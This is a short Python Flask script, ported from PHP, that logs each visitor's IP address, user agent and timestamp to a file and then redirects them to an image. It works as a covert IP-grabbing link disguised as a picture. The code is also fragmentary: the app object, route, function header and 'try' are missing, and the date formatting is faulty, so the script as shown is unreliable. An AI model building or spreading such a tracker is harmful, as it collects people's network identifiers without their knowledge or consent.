from flask import Flask, request, redirect
import datetime
import pytz
CAIRO_TZ = pytz.timezone('Africa/Cairo')
        # date_default_timezone_set('Africa/Cairo');
        # $ip = $_SERVER['REMOTE_ADDR'];
        ip = request.remote_addr
        # $Port = $_SERVER['REMOTE_PORT']; 
        port = 'N/A' 
        # $pd = $_SERVER['HTTP_USER_AGENT'];
        pd = request.headers.get('User-Agent')
        # $dt = date("l dS \of F Y H:i:s A");
        now = datetime.datetime.now(CAIRO_TZ)
        dt = now.strftime("%A %d{} %B %Y %H:%M:%S %p").replace(
            " 01", " 1st").replace(" 02", " 2nd").replace(" 03", " 3rd") 
        # $data = $ip.' '.$dt.' '.$Port.' '.$pd."\n";
        data = f"{ip} {dt} {port} {pd}\n"
        # $file=fopen("ip_log.txt","a");
        # fwrite($file, $data );
        # fclose($file);
        with open("ip_log.txt", "a") as log_file:
            log_file.write(data)          
        # header( 'Location:https://i.postimg.cc/J4cNM9mF/j.jpg');
        return redirect('https://i.postimg.cc/J4cNM9mF/j.jpg', code=302)
    except Exception as e:
        print(f"An error occurred: {e}")
        return redirect('https://i.postimg.cc/J4cNM9mF/j.jpg', code=302)
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
